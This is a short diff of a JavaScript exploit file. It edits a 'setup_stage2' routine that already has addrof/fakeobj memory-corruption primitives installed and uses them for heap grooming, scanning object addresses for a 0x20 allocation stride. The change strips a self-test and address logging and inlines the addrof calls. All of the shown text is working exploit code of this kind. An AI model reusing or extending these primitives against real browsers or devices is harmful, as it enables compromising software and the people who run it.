@@ -18308,9 +18308,6 @@ const device_chipset = {
             return boxed_arr[0];
           }
           print("setup_stage2: addrof/fakeobj installed");
-          const addrofSelfTest = { marker: 0x41414141 };
-          const addrofSelfTestAddr = p.addrof(addrofSelfTest);
-          print(`setup_stage2: addrof self-test=${addrofSelfTestAddr.hex()}`);
           let scribble_element;
           let scribbles = [];
           let prev_addr = 0n;
@@ -18320,14 +18317,13 @@ const device_chipset = {
               p1: 1.1,
               p2: 2.2
             };
-            const current_addr = p.addrof(o);
-            if (current_addr - prev_addr === 0x20n) {
+            if (p.addrof(o) - prev_addr === 0x20n) {
               scribble_element = o;
-              print(`setup_stage2: stride hit i=${i} addr=${current_addr.hex()} prev=${prev_addr.hex()}`);
+              print(`setup_stage2: stride hit i=${i}`);
               break;
             }
             scribbles.push(o);
-            prev_addr = current_addr;
+            prev_addr = p.addrof(o);
           }
           if (!scribble_element) {
             print("scribble_element: allocation stride miss after 1000 attempts");
